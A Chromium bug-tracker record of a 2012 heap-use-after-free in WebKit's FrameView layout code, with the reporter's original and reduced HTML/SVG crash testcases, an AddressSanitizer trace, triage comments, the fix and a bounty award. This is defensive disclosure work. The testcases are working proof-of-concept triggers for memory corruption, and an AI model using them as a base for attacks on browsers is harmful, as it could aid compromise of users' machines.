# Heap-use-after-free in WebCore::FrameView::forceLayoutParentViewIfNeeded

| Field | Value |
|-------|-------|
| **Issue ID** | [40052735](https://issues.chromium.org/issues/40052735) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ax...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-01-13 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Use-after-free can be caused when trying to layout the view for object containing SVG.

**VERSION**  

18.0.1000.0 (Developer Build 116831 Linux)  

16.0.912.75 m, Windows 7 x64.

**REPRODUCTION CASE**  

Crash does not happen immediately, some seconds should be passed. Probably it can require to be run twice.

<link href="none.css" rel="stylesheet" type="text/css"/>
<object id="o" data="a.svg"></object>
<a id="a" style="content:counter(item)"></a>
<script>
setInterval('next\_step();', 1);
function next\_step() {
document.getElementById('a').appendChild( document.getElementById('o').cloneNode(1) );
document.styleSheets[0].insertRule("font {color:black;}", 0);
location.reload();
}
</script>

--- a.svg ---

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<font-face>
<font-face-src>
<font-face-uri xlink:href=""/>
</font-face-src>
</font-face>
</svg>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

==10389== ERROR: AddressSanitizer heap-use-after-free on address 0x7ff650876e90 at pc 0x7ff65ecf89ff bp 0x7fffcc56fdf0 sp 0x7fffcc56fde8  

READ of size 8 at 0x7ff650876e90 thread T0  

#0 0x7ff65ecf89ff in WebCore::RenderObject::document() const /usr/local/google/asan/asan-llvm-trunk/llvm/projects/compiler-rt/lib/asan/asan\_linux.cc:0  

#1 0x7ff65f5bae49 in WebCore::RenderObject::frame() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderObject.h:550  

#2 0x7ff65fa2bccf in WebCore::FrameView::forceLayoutParentViewIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:937  

#3 0x7ff65fa29a79 in WebCore::FrameView::layout(bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:1213  

#4 0x7ff65f1116d4 in WebCore::Document::implicitClose() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:2269  

#5 0x7ff65f951f5a in WebCore::FrameLoader::checkCompleted() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:740  

#6 0x7ff65f950144 in WebCore::FrameLoader::finishedParsing() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:676  

#7 0x7ff65f123a62 in WebCore::Document::finishedParsing() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:4396  

#8 0x7ff65f93ccac in WebCore::DocumentWriter::endIfNotLoadingMainResource() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/DocumentWriter.cpp:234  

#9 0x7ff65f95dc6a in WTF::RefPtr[WebCore::DocumentLoader](javascript:void(0);)::operator->() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:66  

#10 0x7ff65f975180 in WebCore::MainResourceLoader::didFinishLoading(double) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:485  

#11 0x7ff66090168d in webkit\_glue::WebURLLoaderImpl::Context::OnCompletedRequest(net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) /media/Chromium/chromium/depot\_tools/src/webkit/glue/weburlloader\_impl.cc:647  

#12 0x7ff65ec1ec62 in ResourceDispatcher::OnRequestComplete(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:489  

#13 0x7ff65ec1ff36 in bool ResourceMsg\_RequestComplete::Dispatch<ResourceDispatcher, ResourceDispatcher, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)>(IPC::Message const\*, ResourceDispatcher\*, ResourceDispatcher\*, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)) /media/Chromium/chromium/depot\_tools/src/./content/common/resource\_messages.h:168  

#14 0x7ff65ec1c7a6 in ResourceDispatcher::DispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:559  

#15 0x7ff65ec1b954 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:326  

#16 0x7ff65eb2e19a in ChildThread::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/child\_thread.cc:172  

#17 0x7ff65ec710ae in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:263  

#18 0x7ff65ec76418 in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::\*)(IPC::Message const&)>, void ()(IPC::ChannelProxy::Context\* const&, IPC::Message const&)>::MakeItSo(base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::\*)(IPC::Message const&)>, IPC::ChannelProxy::Context\* const&, IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:897  

#19 0x7ff65d7f06b3 in MessageLoop::RunTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:459  

#20 0x7ff65d7f0d04 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:470  

#21 0x7ff65d7f10be in MessageLoop::DoWork() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:660  

#22 0x7ff65d7fd9de in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:28  

#23 0x7ff65d7efdc4 in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:418  

#24 0x7ff65d7eea88 in MessageLoop::Run() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:301  

#25 0x7ff6612e3d38 in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#26 0x7ff65d75e734 in (anonymous namespace)::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:233  

#27 0x7ff65d75e2cb in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:271  

#28 0x7ff65d75da39 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:455  

#29 0x7ff65c2a1947 in ChromeMain /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_main.cc:32  

#30 0x7ff65c2a184b in main /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#31 0x7ff65583ed8e in \_\_libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

0x7ff650876e90 is located 16 bytes inside of 200-byte region [0x7ff650876e80,0x7ff650876f48)  

freed by thread T0 here:  

#0 0x7ff661c8b9b4 in free ??:0  

#1 0x7ff65ff4901a in WebCore::RenderView::releaseWidgets(WTF::Vector<WebCore::RenderWidget\*, 0ul>&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderView.cpp:649  

#2 0x7ff65ff49187 in WebCore::RenderView::updateWidgetPositions() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/rendering/RenderView.cpp:669  

#3 0x7ff65fa2bcc7 in WebCore::FrameView::forceLayoutParentViewIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:937  

#4 0x7ff65fa29a79 in WebCore::FrameView::layout(bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:1213  

#5 0x7ff65f1116d4 in WebCore::Document::implicitClose() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:2269  

#6 0x7ff65f951f5a in WebCore::FrameLoader::checkCompleted() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:740  

#7 0x7ff65f950144 in WebCore::FrameLoader::finishedParsing() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/FrameLoader.cpp:676  

#8 0x7ff65f123a62 in WebCore::Document::finishedParsing() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:4396  

#9 0x7ff65f93ccac in WebCore::DocumentWriter::endIfNotLoadingMainResource() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/DocumentWriter.cpp:234  

#10 0x7ff65f95dc6a in WTF::RefPtr[WebCore::DocumentLoader](javascript:void(0);)::operator->() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:66  

#11 0x7ff65f975180 in WebCore::MainResourceLoader::didFinishLoading(double) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:485  

#12 0x7ff66090168d in webkit\_glue::WebURLLoaderImpl::Context::OnCompletedRequest(net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) /media/Chromium/chromium/depot\_tools/src/webkit/glue/weburlloader\_impl.cc:647  

#13 0x7ff65ec1ec62 in ResourceDispatcher::OnRequestComplete(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:489  

#14 0x7ff65ec1ff36 in bool ResourceMsg\_RequestComplete::Dispatch<ResourceDispatcher, ResourceDispatcher, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)>(IPC::Message const\*, ResourceDispatcher\*, ResourceDispatcher\*, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)) /media/Chromium/chromium/depot\_tools/src/./content/common/resource\_messages.h:168  

#15 0x7ff65ec1c7a6 in ResourceDispatcher::DispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:559  

#16 0x7ff65ec1b954 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:326  

#17 0x7ff65eb2e19a in ChildThread::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/child\_thread.cc:172  

#18 0x7ff65ec710ae in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:263  

#19 0x7ff65ec76418 in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::\*)(IPC::Message const&)>, void ()(IPC::ChannelProxy::Context\* const&, IPC::Message const&)>::MakeItSo(base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::\*)(IPC::Message const&)>, IPC::ChannelProxy::Context\* const&, IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:897  

#20 0x7ff65d7f06b3 in MessageLoop::RunTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:459  

#21 0x7ff65d7f0d04 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:470  

#22 0x7ff65d7f10be in MessageLoop::DoWork() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:660  

#23 0x7ff65d7fd9de in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:28  

#24 0x7ff65d7efdc4 in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:418  

#25 0x7ff65d7eea88 in MessageLoop::Run() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:301  

#26 0x7ff6612e3d38 in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#27 0x7ff65d75e734 in (anonymous namespace)::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:233  

#28 0x7ff65d75e2cb in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:271  

#29 0x7ff65d75da39 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:455  

previously allocated by thread T0 here:  

#0 0x7ff661c8ba94 in malloc ??:0  

#1 0x7ff65f29a6be in WebCore::HTMLPlugInImageElement::createRenderer(WebCore::RenderArena\*, WebCore::RenderStyle\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/HTMLPlugInImageElement.cpp:143  

#2 0x7ff65f1b4ec5 in WebCore::NodeRendererFactory::createRenderer() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/NodeRenderingContext.cpp:304  

#3 0x7ff65f1b52af in WebCore::NodeRendererFactory::createRendererIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/NodeRenderingContext.cpp:350  

#4 0x7ff65f193666 in WebCore::Node::createRendererIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Node.cpp:1427  

#5 0x7ff65f167561 in WebCore::Element::attach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.cpp:938  

#6 0x7ff65f29a891 in WebCore::HTMLPlugInImageElement::attach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/HTMLPlugInImageElement.cpp:161  

#7 0x7ff65f0fe489 in WebCore::ContainerNode::attach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNode.cpp:785  

#8 0x7ff65f16758e in WebCore::Element::attach() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.cpp:946  

#9 0x7ff65f16826e in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.cpp:1055  

#10 0x7ff65f168a78 in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.cpp:1128  

#11 0x7ff65f168a78 in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.cpp:1128  

#12 0x7ff65f110835 in WebCore::Document::recalcStyle(WebCore::Node::StyleChange) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:1562  

#13 0x7ff65f11197e in WebCore::Document::updateStyleIfNeeded() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Document.cpp:1617  

#14 0x7ff65fa35540 in WebCore::FrameView::updateLayoutAndStyleIfNeededRecursive() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/page/FrameView.cpp:2973  

#15 0x7ff65ed166a7 in WebKit::WebViewImpl::layout() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/WebViewImpl.cpp:1180  

#16 0x7ff6612c90e0 in RenderWidget::DoDeferredUpdate() /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_widget.cc:770  

#17 0x7ff6612c44a5 in RenderWidget::DoDeferredUpdateAndSendInputAck() /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_widget.cc:732  

#18 0x7ff6612c06bd in RenderWidget::OnUpdateRectAck() /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_widget.cc:383  

#19 0x7ff6612bfa14 in bool IPC::Message::Dispatch<RenderWidget, RenderWidget>(IPC::Message const\*, RenderWidget\*, RenderWidget\*, void (RenderWidget::\*)()) /media/Chromium/chromium/depot\_tools/src/./ipc/ipc\_message.h:137  

#20 0x7ff6612bf7ab in RenderWidget::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_widget.cc:212  

#21 0x7ff661285bf1 in RenderViewImpl::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/render\_view\_impl.cc:703  

#22 0x7ff65ebfd88d in MessageRouter::RouteMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/message\_router.cc:46  

==10389== ABORTING  

Stats: 128M malloced (175M for red zones) by 611109 calls  

Stats: 10M realloced by 21154 calls  

Stats: 124M freed by 590352 calls  

Stats: 17M really freed by 57226 calls  

Stats: 300M (76820 full pages) mmaped in 75 calls  

mmaps by size class: 8:442341; 9:49146; 10:49140; 11:20470; 12:5120; 13:4096; 14:512; 15:128; 16:64; 17:32; 18:16; 21:2;  

mallocs by size class: 8:477814; 9:50723; 10:52615; 11:20493; 12:4460; 13:4451; 14:381; 15:129; 16:15; 17:24; 18:2; 21:2;  

frees by size class: 8:461160; 9:47895; 10:52219; 11:19750; 12:4388; 13:4420; 14:365; 15:124; 16:8; 17:19; 18:2; 21:2;  

rfrees by size class: 8:44903; 9:4837; 10:4699; 11:1624; 12:355; 13:655; 14:104; 15:23; 16:8; 17:14; 18:2; 21:2;  

Stats: malloc large: 28 small slow: 2383  

Shadow byte and word:  

0x1ffeca10edd2: fd  

0x1ffeca10edd0: fd fd fd fd fd fd fd fd  

More shadow bytes:  

0x1ffeca10edb0: 00 00 00 00 00 00 00 00  

0x1ffeca10edb8: 00 fb fb fb fb fb fb fb  

0x1ffeca10edc0: fa fa fa fa fa fa fa fa  

0x1ffeca10edc8: fa fa fa fa fa fa fa fa  

=>0x1ffeca10edd0: fd fd fd fd fd fd fd fd  

0x1ffeca10edd8: fd fd fd fd fd fd fd fd  

0x1ffeca10ede0: fd fd fd fd fd fd fd fd  

0x1ffeca10ede8: fd fd fd fd fd fd fd fd  

0x1ffeca10edf0: fa fa fa fa fa fa fa fa

## Timeline

### in...@chromium.org (2012-01-13)

Marty, the regression and fixed ranges are coming out wrong (https://cluster-fuzz.appspot.com/testcase?key=11549366), becoz looks like the testcase is flaky. can you please try fixing the setInterval in testcase/use longer timeout and reload testcase on clusterfuzz to get correct impact, regression ranges.

### mb...@chromium.org (2012-01-13)

Here's the new link. It's still being processed but I'm adding it here to keep track of it.

https://cluster-fuzz.appspot.com/testcase?key=11823454

### [Deleted User] (2012-01-13)

filed upstream at https://bugs.webkit.org/show_bug.cgi?id=76309

### in...@chromium.org (2012-01-15)

in c#1, i meant to fix the testcase and not just reupload on clusterfuzz. Don't rely on the regression range, since setinterval is making the testcase flaky.

Ax330d, can you please reduce the testcase to remove setinterval and other randomness ? That will qualify your chances for a higher reward.

### in...@chromium.org (2012-01-15)

[Empty comment from Monorail migration]

### ax...@gmail.com (2012-01-15)

Ok, I will try.

### ax...@gmail.com (2012-01-15)

I will be surprised if this can be even more reduced, but now it works quite stable:

<style></style>
<object data="a.svg"></object>
<object style="content:counter(item)" data="a.svg" onload="go()"/></object>
<script>
    function go() {
        document.styleSheets[0].insertRule("font {}", 0);
        location.reload();
    }
</script>

--- a.svg ---

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <font-face-uri xlink:href=""/>
</svg>


### in...@chromium.org (2012-01-15)

Thanks a lot Ax330d for the quick response. Giving this a shot to get correct regression range.

### in...@chromium.org (2012-01-16)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=13234023

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f499334a890
Crash State:
  - crash stack -
  WebCore::FrameView::forceLayoutParentViewIfNeeded
  WebCore::FrameView::layout
  - free stack -
  WebCore::RenderView::updateWidgetPositions
  WebCore::FrameView::forceLayoutParentViewIfNeeded
  

Minimized Testcase (0.44 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94o4YjbR8t8_ypciFrsPMMtsUn4_de3NxW-BLOTPK2zICWOaXLYP0cjyRNFisHqljEHXV1AZzno2LZA_7cYz5jvNFZV0-lxCOkJxg0oAu8uTM5xgSMbwakJyEKHOMP8Kg2HCB3WeSlIYWF1wb5bBqtZ4Y8FuQ

### in...@chromium.org (2012-01-17)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-18)

http://trac.webkit.org/changeset/105250

### sc...@gmail.com (2012-01-18)

@Ax330d is on fire :)

### in...@chromium.org (2012-01-23)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-01-24)

@Ax330d: another $1000 for another well-reported issue. Don't stop being on fire :D

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### ts...@chromium.org (2012-01-24)

Merged into m17 at r105785.


### sc...@gmail.com (2012-01-31)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-07)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/110112?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052735)*
